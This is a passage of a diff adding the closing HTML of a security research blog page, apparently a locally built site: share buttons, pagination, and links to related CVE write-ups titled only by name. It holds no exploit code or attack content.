+    <i class="fab fa-fw fa-x-twitter" aria-hidden="true"></i><span> X</span>
+  </a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fpwning-the-scammer-new-zero-day%2F" class="btn btn--facebook" aria-label="Share on Facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook">
+    <i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span>
+  </a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4444/research/pwning-the-scammer-new-zero-day/" class="btn btn--linkedin" aria-label="Share on LinkedIn" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn">
+    <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span>
+  </a>
+
+  <a href="https://bsky.app/intent/compose?text=How+I+nabbed+a+new+CVE+from+a+Cookie-Munching%2C+Scam-Slinging+Browser+Extension%20http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fpwning-the-scammer-new-zero-day%2F" class="btn btn--bluesky" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Bluesky">
+    <i class="fab fa-fw fa-bluesky" aria-hidden="true"></i><span> Bluesky</span>
+  </a>
+</section>
+
+
+      
+
+  <nav class="pagination" aria-label="Post pagination">
+    
+      <a href="/research/pwn2own-canon-bof-mf743cdw/" class="pagination--pager" title="[Pwn2Own 2022] CVE-2023-0855: Canon imageClass MF743CDW IPP BOF">Previous</a>
+    
+    
+      <a href="/research/apache-roller-csrf/" class="pagination--pager" title="CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/apache-answer-weak-uuid/" rel="permalink">CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-11-23T00:00:00-05:00">November 23, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/apache-roller-csrf/" rel="permalink">CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-10-12T00:00:00-04:00">October 12, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwn2own-canon-bof-mf743cdw/" rel="permalink">[Pwn2Own 2022] CVE-2023-0855: Canon imageClass MF743CDW IPP BOF
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-05-22T00:00:00-04:00">May 22, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwning-the-samsung-tv/" rel="permalink">Pwning the Samsung TV
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-01-28T00:00:00-05:00">January 28, 2022</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        
+<div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/imspicynoodles" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/0xfatty" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/iam-trchi/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2026 Chi Tran</div>
+
+
+      </footer>
+    </div>
+
+    
+
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
